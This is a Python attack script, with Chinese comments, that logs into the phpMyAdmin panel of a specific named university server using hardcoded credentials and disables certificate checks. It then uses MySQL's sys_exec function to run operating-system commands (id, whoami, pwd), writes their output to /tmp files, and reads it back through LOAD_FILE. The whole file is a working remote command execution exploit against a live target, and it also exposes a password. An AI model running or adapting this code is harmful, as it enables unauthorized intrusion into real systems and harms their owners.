#!/usr/bin/env python3
import requests
import re
import html
import time
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[+] sys_exec可以执行命令，但只返回退出码\n")

# 方法：将命令输出写入/tmp文件，然后用LOAD_FILE读取
print("[*] 执行id命令并将输出写入文件...")
sql = "SELECT sys_exec('id > /tmp/id_output.txt 2>&1');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

time.sleep(1)

# 尝试用LOAD_FILE读取（即使没有FILE权限，LOAD_FILE也可能可以读取某些目录）
print("[*] 尝试读取输出文件...")
sql = "SELECT LOAD_FILE('/tmp/id_output.txt');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
# 解析输出
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if "uid=" in clean.lower() or "gid=" in clean.lower():
        print(f"[+] id命令输出: {clean}")
        break
    elif clean and "NULL" not in clean and len(clean) > 3:
        print(f"[*] 文件内容: {clean[:200]}")

# 执行whoami
print("\n[*] 执行whoami命令...")
sql = "SELECT sys_exec('whoami > /tmp/whoami_output.txt 2>&1');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

time.sleep(1)

sql = "SELECT LOAD_FILE('/tmp/whoami_output.txt');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if clean and "NULL" not in clean and len(clean) > 0:
        print(f"[+] whoami输出: {clean}")

# 执行pwd
print("\n[*] 执行pwd命令...")
sql = "SELECT sys_exec('pwd > /tmp/pwd_output.txt 2>&1');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

time.sleep(1)

sql = "SELECT LOAD_FILE('/tmp/pwd_output.txt');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if clean and "NULL" not in clean and len(clean) > 0:
        print(f"[+] pwd输出: {clean}")

print("\n[+] 完成!")
